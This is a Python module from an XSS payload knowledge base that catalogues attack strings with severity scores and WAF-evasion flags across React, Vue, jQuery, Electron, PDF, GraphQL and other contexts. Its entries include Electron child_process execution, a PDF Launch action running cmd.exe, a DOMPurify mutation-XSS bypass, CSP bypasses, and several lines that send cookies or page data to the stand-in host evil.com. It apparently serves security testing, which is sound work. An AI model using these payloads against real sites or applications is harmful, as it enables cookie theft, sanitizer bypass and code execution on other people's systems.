#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Priority Context Enrichment
Additional payloads for high-priority contexts with low coverage.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === React Additional ===
REACT_PRIORITY_PAYLOADS = {
    "react-dangerously-jsx": PayloadEntry(
        payload="<div dangerouslySetInnerHTML={{__html: `<img src=x onerror=alert(1)>`}}/>",
        contexts=["react", "javascript", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="React dangerouslySetInnerHTML with template literal",
        tags=["react", "dangerously", "template", "literal"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "react-useEffect-innerHTML": PayloadEntry(
        payload='useEffect(() => { document.getElementById("x").innerHTML = props.html; }, [props.html]);',
        contexts=["react", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="React useEffect with innerHTML assignment",
        tags=["react", "useEffect", "innerHTML", "hook"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "react-href-prop": PayloadEntry(
        payload="<a href={userInput}>Link</a>",
        contexts=["react", "javascript", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="React href prop with javascript: protocol",
        tags=["react", "href", "prop", "javascript"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Vue Additional ===
VUE_PRIORITY_PAYLOADS = {
    "vue-compile-template": PayloadEntry(
        payload="Vue.compile(`<div v-html=\"'<img src=x onerror=alert(1)>'\">`)",
        contexts=["vue", "javascript", "template"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Vue.compile with v-html in template",
        tags=["vue", "compile", "v-html", "template"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "vue-v-bind-href": PayloadEntry(
        payload='<a v-bind:href="userInput">Click</a>',
        contexts=["vue", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Vue v-bind:href javascript protocol",
        tags=["vue", "v-bind", "href", "javascript"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "vue-v-on-dynamic": PayloadEntry(
        payload='<div v-on:[eventName]="handler">',
        contexts=["vue", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Vue dynamic event handler name",
        tags=["vue", "v-on", "dynamic", "event"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === jQuery Additional ===
JQUERY_PRIORITY_PAYLOADS = {
    "jquery-prepend": PayloadEntry(
        payload='$("body").prepend(userInput)',
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="jQuery prepend with user input",
        tags=["jquery", "prepend", "dom", "injection"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "jquery-after": PayloadEntry(
        payload='$("div").after(userInput)',
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="jQuery after insertion",
        tags=["jquery", "after", "insertion", "dom"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "jquery-replaceWith": PayloadEntry(
        payload='$("div").replaceWith(userInput)',
        contexts=["jquery", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="jQuery replaceWith injection",
        tags=["jquery", "replaceWith", "dom", "injection"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "jquery-wrap": PayloadEntry(
        payload='$("div").wrap(userInput)',
        contexts=["jquery", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="jQuery wrap with HTML",
        tags=["jquery", "wrap", "html", "dom"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Fetch API Additional ===
FETCH_PRIORITY_PAYLOADS = {
    "fetch-eval-response": PayloadEntry(
        payload="fetch(url).then(r=>r.text()).then(eval)",
        contexts=["fetch", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Fetch response directly to eval",
        tags=["fetch", "eval", "response", "rce"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "fetch-json-innerHTML": PayloadEntry(
        payload="fetch(url).then(r=>r.json()).then(d=>{el.innerHTML=d.html})",
        contexts=["fetch", "javascript", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Fetch JSON to innerHTML",
        tags=["fetch", "json", "innerHTML", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "fetch-redirect-ssrf": PayloadEntry(
        payload='fetch(userUrl, {redirect: "follow"})',
        contexts=["fetch", "javascript", "url"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Fetch with redirect following (SSRF)",
        tags=["fetch", "redirect", "ssrf", "follow"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === WebSocket Additional ===
WEBSOCKET_PRIORITY_PAYLOADS = {
    "websocket-onmessage-html": PayloadEntry(
        payload="ws.onmessage = (e) => { document.body.innerHTML += e.data; }",
        contexts=["websocket_handler", "websocket_message", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="WebSocket message to innerHTML",
        tags=["websocket", "onmessage", "innerHTML", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "websocket-json-eval": PayloadEntry(
        payload='ws.onmessage = (e) => { const msg = JSON.parse(e.data); if(msg.type==="eval") eval(msg.code); }',
        contexts=["websocket_handler", "websocket_message", "javascript", "json"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="WebSocket JSON command execution",
        tags=["websocket", "json", "eval", "command"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "websocket-url-injection": PayloadEntry(
        payload='new WebSocket("wss://evil.com/ws?token=" + document.cookie)',
        contexts=["websocket_url", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="WebSocket URL with cookie exfil",
        tags=["websocket", "url", "cookie", "exfil"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Electron Additional (Desktop apps) ===
ELECTRON_PRIORITY_PAYLOADS = {
    "electron-shell-openExternal": PayloadEntry(
        payload='require("electron").shell.openExternal(userUrl)',
        contexts=["electron", "javascript", "url"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Electron shell.openExternal (RCE)",
        tags=["electron", "shell", "openExternal", "rce"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "electron-nodeIntegration": PayloadEntry(
        payload="<webview src=\"data:text/html,<script>require('child_process').exec('calc')</script>\" nodeintegration></webview>",
        contexts=["electron", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=10.0,
        description="Electron webview nodeIntegration RCE",
        tags=["electron", "webview", "nodeintegration", "rce"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "electron-preload-bypass": PayloadEntry(
        payload='window.top.require("child_process").exec("id")',
        contexts=["electron", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=10.0,
        description="Electron preload script bypass",
        tags=["electron", "preload", "bypass", "rce"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === PDF XSS Additional ===
PDF_PRIORITY_PAYLOADS = {
    "pdf-launch-action": PayloadEntry(
        payload="/Type /Action /S /Launch /Win << /F (cmd.exe) /P (/c calc) >>",
        contexts=["pdf", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="PDF Launch action (RCE)",
        tags=["pdf", "launch", "action", "rce"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "pdf-javascript-action": PayloadEntry(
        payload="/Type /Action /S /JavaScript /JS (app.alert(1))",
        contexts=["pdf", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="PDF JavaScript action",
        tags=["pdf", "javascript", "action", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "pdf-submitform": PayloadEntry(
        payload="/Type /Action /S /SubmitForm /F (https://evil.com/steal)",
        contexts=["pdf", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="PDF SubmitForm to attacker",
        tags=["pdf", "submitform", "exfil", "form"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === GraphQL Additional ===
GRAPHQL_PRIORITY_PAYLOADS = {
    "graphql-query-stored": PayloadEntry(
        payload="query{user(id:1){bio}}",
        contexts=["graphql_query", "json"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="GraphQL query returning stored XSS",
        tags=["graphql", "query", "stored", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "graphql-query-introspection": PayloadEntry(
        payload="query{__schema{types{name fields{name}}}}",
        contexts=["graphql_query", "json"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="GraphQL introspection query",
        tags=["graphql", "introspection", "schema", "recon"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "graphql-variable-xss": PayloadEntry(
        payload='{"query":"mutation($x:String!){update(val:$x)}","variables":{"x":"<script>alert(1)</script>"}}',
        contexts=["graphql_variable", "graphql_mutation", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="GraphQL variable with XSS payload",
        tags=["graphql", "variable", "mutation", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === PostMessage Additional ===
POSTMESSAGE_PRIORITY_PAYLOADS = {
    "postmessage-no-origin-check": PayloadEntry(
        payload='window.addEventListener("message", (e) => { eval(e.data); })',
        contexts=["postmessage", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="postMessage without origin check",
        tags=["postmessage", "no-origin", "eval", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "postmessage-innerHTML": PayloadEntry(
        payload='window.addEventListener("message", (e) => { document.body.innerHTML = e.data.html; })',
        contexts=["postmessage", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="postMessage to innerHTML",
        tags=["postmessage", "innerHTML", "dom", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "postmessage-location": PayloadEntry(
        payload='window.addEventListener("message", (e) => { if(e.data.redirect) location = e.data.url; })',
        contexts=["postmessage", "javascript", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="postMessage redirect",
        tags=["postmessage", "redirect", "location", "open"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Prototype Pollution Additional ===
PROTOTYPE_POLLUTION_PRIORITY = {
    "proto-merge-deep": PayloadEntry(
        payload='merge({}, JSON.parse(\'{"__proto__":{"isAdmin":true}}\'))',
        contexts=["prototype_pollution", "javascript", "json"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Deep merge prototype pollution",
        tags=["prototype", "pollution", "merge", "deep"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "proto-lodash-set": PayloadEntry(
        payload='_.set({}, "__proto__.xss", "<img src=x onerror=alert(1)>")',
        contexts=["prototype_pollution", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Lodash _.set prototype pollution",
        tags=["prototype", "pollution", "lodash", "set"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "proto-Object-assign": PayloadEntry(
        payload='Object.assign({}, {["__proto__"]: {polluted: true}})',
        contexts=["prototype_pollution", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Object.assign prototype pollution attempt",
        tags=["prototype", "pollution", "Object.assign", "attempt"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Mutation XSS Additional ===
MUTATION_XSS_PRIORITY = {
    "mxss-dompurify-bypass": PayloadEntry(
        payload="<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->",
        contexts=["mutation", "html_content", "sanitizer_api"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="DOMPurify bypass via mXSS",
        tags=["mxss", "dompurify", "bypass", "sanitizer"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mxss-innerhtml-reparse": PayloadEntry(
        payload="<div><svg></p><style><g/onload=alert(1)>",
        contexts=["mutation", "html_content", "svg"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="innerHTML reparse mXSS",
        tags=["mxss", "innerHTML", "reparse", "svg"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mxss-namespace-switch": PayloadEntry(
        payload="<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
        contexts=["mutation", "html_content", "svg", "xml"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="SVG namespace switch mXSS",
        tags=["mxss", "namespace", "svg", "cdata"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSP Bypass Additional ===
CSP_BYPASS_PRIORITY = {
    "csp-jsonp-callback": PayloadEntry(
        payload='<script src="https://trusted.com/api?callback=alert"></script>',
        contexts=["csp_bypass", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="CSP bypass via JSONP callback",
        tags=["csp", "bypass", "jsonp", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "csp-angular-sandbox": PayloadEntry(
        payload='{{constructor.constructor("alert(1)")()}}',
        contexts=["csp_bypass", "template", "angular"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="CSP bypass via Angular sandbox escape",
        tags=["csp", "bypass", "angular", "sandbox"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "csp-script-gadget": PayloadEntry(
        payload='<script src="https://trusted.com/lib.js#\nalert(1)"></script>',
        contexts=["csp_bypass", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSP bypass via script gadget",
        tags=["csp", "bypass", "gadget", "script"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === DOM Clobbering Additional ===
DOM_CLOBBERING_PRIORITY = {
    "clobber-defaultView": PayloadEntry(
        payload='<img id="document" name="defaultView"><img id="document" name="cookie">',
        contexts=["dom_clobbering", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="DOM clobbering document.defaultView",
        tags=["clobbering", "document", "defaultView"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "clobber-form-elements": PayloadEntry(
        payload='<form id="test"><input id="action" value="javascript:alert(1)"><input id="submit"></form>',
        contexts=["dom_clobbering", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Form elements clobbering",
        tags=["clobbering", "form", "elements", "action"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Scriptless XSS Additional ===
SCRIPTLESS_PRIORITY = {
    "scriptless-dangling-markup": PayloadEntry(
        payload='<img src="https://evil.com/log?html=',
        contexts=["scriptless", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=6.5,
        description="Dangling markup injection for HTML exfil",
        tags=["scriptless", "dangling", "markup", "exfil"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "scriptless-css-exfil": PayloadEntry(
        payload='<style>input[value^="a"]{background:url(https://evil.com/a)}</style>',
        contexts=["scriptless", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="CSS attribute selector exfil",
        tags=["scriptless", "css", "attribute", "selector"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "scriptless-link-prefetch": PayloadEntry(
        payload='<link rel="prefetch" href="https://evil.com/log">',
        contexts=["scriptless", "html_content"],
        severity=Severity.LOW,
        cvss_score=4.0,
        description="Link prefetch for tracking",
        tags=["scriptless", "link", "prefetch", "tracking"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Default Context Additional ===
DEFAULT_PRIORITY = {
    "default-body-onload": PayloadEntry(
        payload="<body onload=alert(1)>",
        contexts=["default", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Body onload event",
        tags=["default", "body", "onload", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "default-input-onfocus": PayloadEntry(
        payload="<input onfocus=alert(1) autofocus>",
        contexts=["default", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Input autofocus onfocus",
        tags=["default", "input", "onfocus", "autofocus"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "default-marquee": PayloadEntry(
        payload="<marquee onstart=alert(1)>",
        contexts=["default", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Marquee onstart event",
        tags=["default", "marquee", "onstart", "event"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined
PRIORITY_ENRICHMENT_PAYLOADS = {
    **REACT_PRIORITY_PAYLOADS,
    **VUE_PRIORITY_PAYLOADS,
    **JQUERY_PRIORITY_PAYLOADS,
    **FETCH_PRIORITY_PAYLOADS,
    **WEBSOCKET_PRIORITY_PAYLOADS,
    **ELECTRON_PRIORITY_PAYLOADS,
    **PDF_PRIORITY_PAYLOADS,
    **GRAPHQL_PRIORITY_PAYLOADS,
    **POSTMESSAGE_PRIORITY_PAYLOADS,
    **PROTOTYPE_POLLUTION_PRIORITY,
    **MUTATION_XSS_PRIORITY,
    **CSP_BYPASS_PRIORITY,
    **DOM_CLOBBERING_PRIORITY,
    **SCRIPTLESS_PRIORITY,
    **DEFAULT_PRIORITY,
}

PRIORITY_ENRICHMENT_TOTAL = len(PRIORITY_ENRICHMENT_PAYLOADS)
